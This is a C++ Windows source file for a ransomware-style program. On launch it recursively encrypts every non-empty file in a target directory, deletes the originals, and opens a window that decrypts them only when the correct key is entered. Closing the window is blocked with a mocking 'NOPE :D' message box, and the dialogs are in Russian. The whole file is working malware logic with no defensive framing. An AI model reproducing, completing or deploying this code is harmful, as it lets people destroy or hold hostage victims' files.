#include "Common.hpp"

cryptor::KEY_TYPE TrueKEY = cryptor::GenerateKEY(cryptor::XorShift128());

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    InitWNDCLASS(hInstance, CLASS_NAME, WindowProcedure);

    try {
        for (fs::path dirEntry : recursive_directory_iterator(DIR)) {
            if (!CHECKFILEEX(dirEntry) && !fs::is_directory(dirEntry) && !fs::is_empty(dirEntry)) {
                CryptFile(dirEntry.relative_path().string(), TrueKEY, ENCFILE_EX);
                fs::remove(dirEntry.relative_path());
            }
        }
    }
    catch (const std::exception& e) { std::cout << e.what() << std::endl; }

    HWND hwnd = CreateWindowEx( 0, CLASS_NAME, "",
        WS_OVERLAPPED | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        WindowSize, WindowSize / 2,
        NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) return 1;

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE:
        CreateWidget(hwnd);
        break;
    case WM_COMMAND:
        switch (wParam) {
        case ButtonID:
            char buffer[64];
            GetWindowText(GetDlgItem(hwnd, EditBoxID), buffer, sizeof(buffer) / sizeof(wchar_t));

            cryptor::KEY_TYPE KEY;

            if (sscanf(buffer, "%llu", &KEY) == 1) {
                if (cryptor::KEYIsCorrect(KEY)) {
                    MessageBox(hwnd, std::to_string(KEY).c_str(), "Ключ принят", MB_OK | MB_ICONINFORMATION);

                    try {
                        if (cryptor::KEYIsCorrect(KEY)) {
                            for (fs::path dirEntry : recursive_directory_iterator(DIR)) {
                                if (CHECKFILEEX(dirEntry) && !fs::is_directory(dirEntry) && !fs::is_empty(dirEntry)) {
                                    std::cout << dirEntry << std::endl;

                                    DeCryptFile(dirEntry.relative_path().string(), KEY, ENCFILE_EX);
                                    fs::remove(dirEntry.relative_path());
                                }
                            }
                        }
                    } catch (const std::exception& e) { std::cout << e.what() << std::endl; }

                    PostQuitMessage(0);
                }

                else MessageBox(hwnd, "Не верный ключ", "", MB_OK | MB_ICONERROR);
            }
            break;
        }
        break;
    case WM_CLOSE:  MessageBox(hwnd, "NOPE :D", "LOL", MB_OK | MB_ICONERROR); break;
    default:        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}